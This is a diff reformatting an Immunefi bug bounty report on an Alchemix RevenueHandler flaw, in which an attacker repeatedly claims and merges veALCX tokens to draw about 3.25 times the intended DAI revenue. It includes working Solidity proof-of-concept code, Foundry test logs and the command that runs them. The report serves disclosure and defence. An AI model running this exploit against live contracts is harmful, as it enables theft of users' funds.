@@ -1,5 +1,6 @@
+# 30972 - \[SC - Critical] Theft of unclaimed yield of the revenue in the ...
 
-# Theft of unclaimed yield of the revenue in the RevenueHandler contract by claimming and merge the tokens 
+## Theft of unclaimed yield of the revenue in the RevenueHandler contract by claimming and merge the tokens
 
 Submitted on May 9th 2024 at 23:19:54 UTC by @perseverance for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)
 
@@ -12,19 +13,21 @@ Report severity: Critical
 Target: https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol
 
 Impacts:
-- Theft of unclaimed royalties
-- Theft of unclaimed yield
+
+* Theft of unclaimed royalties
+* Theft of unclaimed yield
+
+### Description
 
 ## Description
-# Description
 
-## Brief/Intro
+### Brief/Intro
 
-Theft of unclaimed yield of the revenue in the RevenueHandler contract by claimming and merge the tokens bug. 
+Theft of unclaimed yield of the revenue in the RevenueHandler contract by claimming and merge the tokens bug.
 
-RevenueHandler contract is to distributes protocol revenue to veToken holders. 
+RevenueHandler contract is to distributes protocol revenue to veToken holders.
 
-This contract can receive the ERC20 token and users with VeALCX tokens can receive the rewards by calling the function 
+This contract can receive the ERC20 token and users with VeALCX tokens can receive the rewards by calling the function
 
 https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L186-L225
 
@@ -53,7 +56,7 @@ function claim(
 
 ```
 
-The claimable amount of a user is calculated based on the token balance at each epoch as in the internal function 
+The claimable amount of a user is calculated based on the token balance at each epoch as in the internal function
 
 https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L297-L326
 
@@ -91,25 +94,23 @@ https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler
     }
 ```
 
-Each time when the function [checkpoint()](https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L228) is called then **currentEpoch** is updated with the current epoch. 
+Each time when the function [checkpoint()](https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L228) is called then **currentEpoch** is updated with the current epoch.
 
-So after this RevenueHandler receive some token then the VeAlcx token holders will receive the reward and can claim these rewards by calling claim function in the RevenueHandler() contract. 
+So after this RevenueHandler receive some token then the VeAlcx token holders will receive the reward and can claim these rewards by calling claim function in the RevenueHandler() contract.
 
-## The vulnerability
-### Vulnerability Details
+### The vulnerability
 
-For easier to understand, I will explain the bug with some POC code and some data to easier to follow. 
+#### Vulnerability Details
 
-Now the attacker can theft of the token in this contract to get several times bigger than intended by Alchemix DAO system. 
-Suppose that the Revenue Handler contract receive 1000 * e18 DAI token. 
-Suppose that a user is to be receive 200 * e18 DAI token because he has locked 10 * e18 BPT into the Voting Escrow contract. 
-(suppose: The total amount of lock BPT is 100 * e18 BPT). 
+For easier to understand, I will explain the bug with some POC code and some data to easier to follow.
 
-Now the attacker can manipulate the system top get several times bigger then the intended amount of DAI token. I can demonstrate in the POC section that the attacker can get 650 * e18 DAI token that is 3.25 times bigger than the intended amount. 
+Now the attacker can theft of the token in this contract to get several times bigger than intended by Alchemix DAO system. Suppose that the Revenue Handler contract receive 1000 \* e18 DAI token. Suppose that a user is to be receive 200 \* e18 DAI token because he has locked 10 \* e18 BPT into the Voting Escrow contract. (suppose: The total amount of lock BPT is 100 \* e18 BPT).
 
-How to do that? 
+Now the attacker can manipulate the system top get several times bigger then the intended amount of DAI token. I can demonstrate in the POC section that the attacker can get 650 \* e18 DAI token that is 3.25 times bigger than the intended amount.
 
-Step 1: To prepare for the attack, the attacker will mint many tokenIds. Suppose the attacker has 10 *e18 BPT as the capital. He will mint 10 tokenIds with each token lock e18 BPT. 
+How to do that?
+
+Step 1: To prepare for the attack, the attacker will mint many tokenIds. Suppose the attacker has 10 \*e18 BPT as the capital. He will mint 10 tokenIds with each token lock e18 BPT.
 
 ```solidity
  for (uint256 i = 0; i < count; i++) {
@@ -117,10 +118,9 @@ Step 1: To prepare for the attack, the attacker will mint many tokenIds. Suppose
 } 
 ```
 
-Step 2: Wait for the contract RevenueHandler to receive some token. 
-For example in this POC, it is 1000* 10^18 DAI 
+Step 2: Wait for the contract RevenueHandler to receive some token. For example in this POC, it is 1000\* 10^18 DAI
 
-Step3: The attacker will choose to launch the attack in the block that have block.timestamp = nearest timestamp that have modulo 2 weeks is zero. 
+Step3: The attacker will choose to launch the attack in the block that have block.timestamp = nearest timestamp that have modulo 2 weeks is zero.
 
 ```solidity
     uint256 internal constant WEEK = 2 weeks;
@@ -128,13 +128,11 @@ Step3: The attacker will choose to launch the attack in the block that have bloc
     hevm.warp((block.timestamp / WEEK) * WEEK + WEEK ) ; // The block.timestamp % WEEK = 0 
 ```
 
-This block.timestamp is important. 
-It is possible to do so, because the Ethereum block now is exact 12 seconds a block. 
-See references: https://ethereum.org/en/developers/docs/blocks/ 
+This block.timestamp is important. It is possible to do so, because the Ethereum block now is exact 12 seconds a block. See references: https://ethereum.org/en/developers/docs/blocks/
 
-So attacker can choose to launch the attack. 
+So attacker can choose to launch the attack.
 
-Step 4: The attacker will continuously call the sequence in an attack contract 
+Step 4: The attacker will continuously call the sequence in an attack contract
 
 ```solidity
     for (uint256 i = 0; i < count-1; ++i) {
@@ -156,15 +154,17 @@ Step 4: The attacker will continuously call the sequence in an attack contract
         revenueHandler.claim(tokenIds[count-1], dai, address(0x00), claimable, address(this));
 ```
 
-The attack is done. Check the DAI balance of the attacker. 
-    
-    ```solidity
-    console2.log("Balance of the attacker: %s",IERC20(dai).balanceOf(attacker));
-    ```
+The attack is done. Check the DAI balance of the attacker.
 
-#### Why this is possible? 
+````
+```solidity
+console2.log("Balance of the attacker: %s",IERC20(dai).balanceOf(attacker));
+```
+````
 
-Because in the function _claimable() above the totalClaimable is calculated 
+**Why this is possible?**
+
+Because in the function \_claimable() above the totalClaimable is calculated
 
 ```solidity
     for (
@@ -180,14 +180,13 @@ Because in the function _claimable() above the totalClaimable is calculated
         }
 ```
 
-So the loop is from lastClaimEpochTimestamp + WEEK to currentEpoch and totalClaimable is a sum of the epochRevenue * epochUserVeBalance / epochTotalVeSupply. 
+So the loop is from lastClaimEpochTimestamp + WEEK to currentEpoch and totalClaimable is a sum of the epochRevenue \* epochUserVeBalance / epochTotalVeSupply.
 
-So the epochTimestamp is calculated based and the loop would go up until currentEpoch. This storage variable is updated in checkpoint() function. 
+So the epochTimestamp is calculated based and the loop would go up until currentEpoch. This storage variable is updated in checkpoint() function.
 
 Also for this attack, the tokenConfig.poolAdapter is zero and the ERC20 token reward stays in the contract.
 
-When the ERC20 stays in the contract, then everytime checkpoint() is called then the epochRevenues got updated. 
-
+When the ERC20 stays in the contract, then everytime checkpoint() is called then the epochRevenues got updated.
 
 https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L228-L231
 
@@ -207,7 +206,7 @@ https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler
 
 ```
 
-https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L228-L231 
+https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L228-L231
 
 ```solidity
 function checkpoint() public {
@@ -218,21 +217,20 @@ function checkpoint() public {
     }
 ```
 
-So the currentEpoch is always round down to the timestamp that is modulo of 2 weeks that is 0 . 
+So the currentEpoch is always round down to the timestamp that is modulo of 2 weeks that is 0 .
 
 ```solidity
 currentEpoch % WEEK = 0 
 
 ```
 
-That is the reason that the attacker need to launch the attack at the exact timestamp to be able to exploit this and gain benefit. 
+That is the reason that the attacker need to launch the attack at the exact timestamp to be able to exploit this and gain benefit.
 
+So when at this block.timestamp, the attacker can claim the reward amount of the tokenId1. Suppose that the tokenID1 has balance of 10\*\*18
 
-So when at this block.timestamp, the attacker can claim the reward amount of the tokenId1. Suppose that the tokenID1 has balance of 10**18 
+Claimable amount = 10\*\*18 \* K = 19999999999851780798
 
-Claimable amount = 10**18 * K = 19999999999851780798 
-
-Then the attacker call merge token to merge tokenId1 with tokenId2 
+Then the attacker call merge token to merge tokenId1 with tokenId2
 
 https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L618C5-L651C6
 
@@ -251,7 +249,7 @@ function merge(uint256 _from, uint256 _to) external {
 
 ```
 
-You notice that the balance of tokenId2 is also added with balance of tokenId1 in the _depositFor 
+You notice that the balance of tokenId2 is also added with balance of tokenId1 in the \_depositFor
 
 https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L1331
 
@@ -259,17 +257,15 @@ https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.s
     _locked.amount += _value;
 ```
 
-So now balance of tokenId2 is 2* 10 ** 18 
+So now balance of tokenId2 is 2\* 10 \*\* 18
 
-And the claimable amount of tokenId2 is 
+And the claimable amount of tokenId2 is
 
-claimable = BalanceTokenId2 * K  = 2* 10 ** 18 * K 
-=> total claimable = 29999999999932197599 
+claimable = BalanceTokenId2 \* K = 2\* 10 \*\* 18 \* K => total claimable = 29999999999932197599
 
-After the first loop, you can see that the claimable in increased abnormally. 
+After the first loop, you can see that the claimable in increased abnormally.
 
-
-This loop can continue and the claimable amount for the attacker is increased. 
+This loop can continue and the claimable amount for the attacker is increased.
 
 ```
 [PASS] testClaimRevenueMerge_Hacked() (gas: 11599416)
@@ -300,32 +296,31 @@ Logs:
 
 ```
 
-At the end the total amount that the attacker gained is 649999999998841051983 that is 3.25 times bigger than  19999999999851780798. 
+At the end the total amount that the attacker gained is 649999999998841051983 that is 3.25 times bigger than 19999999999851780798.
 
-This is because after each merge, the balance of the first token is added up to the balance of the second token. So the attacker gain 2 claimable amount for the first token. 
-So by adding more loops, the gain increased but also the gas spent. So attacker will need to calculate to find the optimal value. 
-But for demonstrating purpose, it is enough to show the bug. 
+This is because after each merge, the balance of the first token is added up to the balance of the second token. So the attacker gain 2 claimable amount for the first token. So by adding more loops, the gain increased but also the gas spent. So attacker will need to calculate to find the optimal value. But for demonstrating purpose, it is enough to show the bug.
 
-# Impacts
-# About the severity assessment
+## Impacts
 
-The impact is that the attacker will be able to exploit the system to get several times bigger the Claim amount of Revenue Handler contract. For example, in the POC, the attacker can get 3.25 times bigger with the same capital. 
+## About the severity assessment
 
+The impact is that the attacker will be able to exploit the system to get several times bigger the Claim amount of Revenue Handler contract. For example, in the POC, the attacker can get 3.25 times bigger with the same capital.
 
-The severity: High 
+The severity: High
 
-Category: 
- - Theft of unclaimed yield or Theft of unclaimed royalties 
+Category:
 
+* Theft of unclaimed yield or Theft of unclaimed royalties
 
-Capital for the attack: Gas to execute the transactions. Some amount of BPT to invest to lock to get the VeAlcx tokens. BPT can be big, the the bigger amount of the rewards. Can theft most of the reward token in the contract. 
+Capital for the attack: Gas to execute the transactions. Some amount of BPT to invest to lock to get the VeAlcx tokens. BPT can be big, the the bigger amount of the rewards. Can theft most of the reward token in the contract.
 
-Easy to exploit and easy to be automated. 
+Easy to exploit and easy to be automated.
+
+### Proof of concept
 
 ## Proof of concept
-#  Proof of concept
 
-I created the POC code as follow: 
+I created the POC code as follow:
 
 ```solidity
 function testClaimRevenueMerge_Hacked() external {
@@ -379,9 +374,10 @@ function testClaimRevenueMerge_Hacked() external {
     }
 ```
 
-I already explained the attack above. 
+I already explained the attack above.
 
-The log shows: 
+The log shows:
+
 ```
 [PASS] testClaimRevenueMerge_Hacked() (gas: 11599416)
 Logs:
@@ -411,9 +407,9 @@ Logs:
 
 ```
 
-At the end Balance of the attacker: 649999999998841051983 DAI 
+At the end Balance of the attacker: 649999999998841051983 DAI
 
-I also created a test case to show in a normal case, what the user get 
+I also created a test case to show in a normal case, what the user get
 
 ```solidity
 function testClaimRevenueMerge_Normal() external {
@@ -449,7 +445,7 @@ function testClaimRevenueMerge_Normal() external {
 
 ```
 
-The log shows: 
+The log shows:
 
 ```solidity
 [PASS] testClaimRevenueMerge_Normal() (gas: 2256883)
@@ -463,7 +459,7 @@ Logs:
   Balance of the attacker: 199999999999936927998
 ```
 
-So the Full POC code: 
+So the Full POC code:
 
 ```
     function _accrueRevenueAndJump1Epoch(uint256 revAmt) internal {
@@ -555,15 +551,15 @@ So the Full POC code:
     }
 ```
 
-To run the test code, 
-Copy the test cases above into the file: https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/test/RevenueHandler.t.sol 
+To run the test code, Copy the test cases above into the file: https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/test/RevenueHandler.t.sol
 
-Run command 
+Run command
+
 ```
 
 FOUNDRY_PROFILE=default forge test --fork-url https://rpc.ankr.com/eth --match-path src/test/RevenueHandler.t.sol --match-test testClaimRevenueMerge  --fork-block-number 19822400 -vvvvv  > testClaimRevenueMerge.log
 ```
 
-The full log with debug information: 
+The full log with debug information:
 
-https://drive.google.com/file/d/1FpWmwrAZGfwaDnrg67H-5Vq_xaokadaW/view?usp=sharing
+https://drive.google.com/file/d/1FpWmwrAZGfwaDnrg67H-5Vq\_xaokadaW/view?usp=sharing
